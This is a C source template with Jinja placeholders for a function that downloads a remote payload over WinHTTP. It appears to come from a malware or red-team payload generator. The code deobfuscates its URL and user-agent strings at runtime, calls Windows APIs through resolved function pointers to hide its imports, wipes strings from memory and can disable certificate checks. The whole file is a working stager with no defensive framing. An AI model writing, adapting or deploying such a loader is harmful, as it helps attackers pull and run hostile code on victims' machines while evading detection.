BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
    wchar_t url_wide[512];
    wchar_t user_agent_wide[256];
    
    pfnRtlZeroMemory(url_wide, sizeof(url_wide));
    pfnRtlZeroMemory(user_agent_wide, sizeof(user_agent_wide));

    {% if obfuscate_http_strings %}
        unsigned char url_bytes[] = { {{ url_obfuscated }} };
        unsigned char user_agent_bytes[] = { {{ user_agent_obfuscated }} };
        
        DeobfuscateString(url_bytes, sizeof(url_bytes));
        MultiByteToWideChar(CP_ACP, 0, (LPCSTR)url_bytes, sizeof(url_bytes), url_wide, 512);
        pfnRtlZeroMemory(url_bytes, sizeof(url_bytes)); // Securely wipe plaintext bytes

        DeobfuscateString(user_agent_bytes, sizeof(user_agent_bytes));
        MultiByteToWideChar(CP_ACP, 0, (LPCSTR)user_agent_bytes, sizeof(user_agent_bytes), user_agent_wide, 256);
        pfnRtlZeroMemory(user_agent_bytes, sizeof(user_agent_bytes)); // Securely wipe plaintext bytes

    {% else %}
        pfnRtlMoveMemory(url_wide, L"{{ url }}", sizeof(L"{{ url }}"));
        pfnRtlMoveMemory(user_agent_wide, L"{{ user_agent }}", sizeof(L"{{ user_agent }}"));
    {% endif %}

    BOOL bTrustInvalidCert = {{ trust_invalid_cert }};
    
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    PBYTE temp_buffer = NULL;
    DWORD total_size = 0;

    URL_COMPONENTSW urlComp;
    pfnRtlZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    
    urlComp.nScheme = INTERNET_SCHEME_UNKNOWN;
    urlComp.lpszHostName = NULL;
    urlComp.dwHostNameLength = 1;
    urlComp.lpszUrlPath = NULL;
    urlComp.dwUrlPathLength = 1;

    if (!pfnWinHttpCrackUrl(url_wide, 0, 0, &urlComp)) {
        return FALSE;
    }

    hSession = pfnWinHttpOpen(user_agent_wide, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    pfnRtlZeroMemory(user_agent_wide, sizeof(user_agent_wide)); // Securely wipe user agent after use

    if (!hSession) {
        return FALSE;
    }

    if (bTrustInvalidCert && urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        pfnWinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    wchar_t host_name_buffer[256];
    pfnRtlZeroMemory(host_name_buffer, sizeof(host_name_buffer));
    if (urlComp.lpszHostName && urlComp.dwHostNameLength > 0 && urlComp.dwHostNameLength < 256) {
        pfnRtlMoveMemory(host_name_buffer, urlComp.lpszHostName, urlComp.dwHostNameLength * sizeof(wchar_t));
        host_name_buffer[urlComp.dwHostNameLength] = L'\0';
    }

    hConnect = pfnWinHttpConnect(hSession, host_name_buffer, urlComp.nPort, 0);
    if (!hConnect) {
        pfnWinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    wchar_t url_path_buffer[512];
    pfnRtlZeroMemory(url_path_buffer, sizeof(url_path_buffer));
    if (urlComp.lpszUrlPath && urlComp.dwUrlPathLength > 0 && urlComp.dwUrlPathLength < 512) {
        pfnRtlMoveMemory(url_path_buffer, urlComp.lpszUrlPath, urlComp.dwUrlPathLength * sizeof(wchar_t));
        url_path_buffer[urlComp.dwUrlPathLength] = L'\0';
    }
    
    pfnRtlZeroMemory(url_wide, sizeof(url_wide)); // Securely wipe full URL string after its components have been used

    hRequest = pfnWinHttpOpenRequest(hConnect, L"GET", url_path_buffer, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0));
    if (!hRequest) {
        pfnWinHttpCloseHandle(hConnect);
        pfnWinHttpCloseHandle(hSession);
        return FALSE;
    }

    bResults = pfnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        pfnWinHttpCloseHandle(hRequest);
        pfnWinHttpCloseHandle(hConnect);
        pfnWinHttpCloseHandle(hSession);
        return FALSE;
    }

    bResults = pfnWinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        pfnWinHttpCloseHandle(hRequest);
        pfnWinHttpCloseHandle(hConnect);
        pfnWinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    DWORD dwContentLength = 0;
    DWORD dwSizeOf = sizeof(dwContentLength);
    bResults = pfnWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwContentLength, &dwSizeOf, WINHTTP_NO_HEADER_INDEX);
    
    if (bResults && dwContentLength > 0) {
        *ppData = (PBYTE)pfnHeapAlloc(pfnGetProcessHeap(), HEAP_ZERO_MEMORY, dwContentLength);
        if (*ppData) {
            pfnWinHttpReadData(hRequest, *ppData, dwContentLength, &dwDownloaded);
            *pdwDataSize = dwDownloaded;
        }
    } else {
        do {
            dwSize = 0;
            if (!pfnWinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            PBYTE new_buffer = (PBYTE)pfnHeapAlloc(pfnGetProcessHeap(), HEAP_ZERO_MEMORY, total_size + dwSize);
            if (new_buffer == NULL) break;
            
            if (temp_buffer != NULL) {
                pfnRtlMoveMemory(new_buffer, temp_buffer, total_size);
                pfnHeapFree(pfnGetProcessHeap(), 0, temp_buffer);
            }
            temp_buffer = new_buffer;

            if (!pfnWinHttpReadData(hRequest, temp_buffer + total_size, dwSize, &dwDownloaded)) break;
            total_size += dwDownloaded;
        } while (dwDownloaded > 0);
        *ppData = temp_buffer;
        *pdwDataSize = total_size;
    }

    pfnWinHttpCloseHandle(hRequest);
    pfnWinHttpCloseHandle(hConnect);
    pfnWinHttpCloseHandle(hSession);

    return (*ppData != NULL);
}
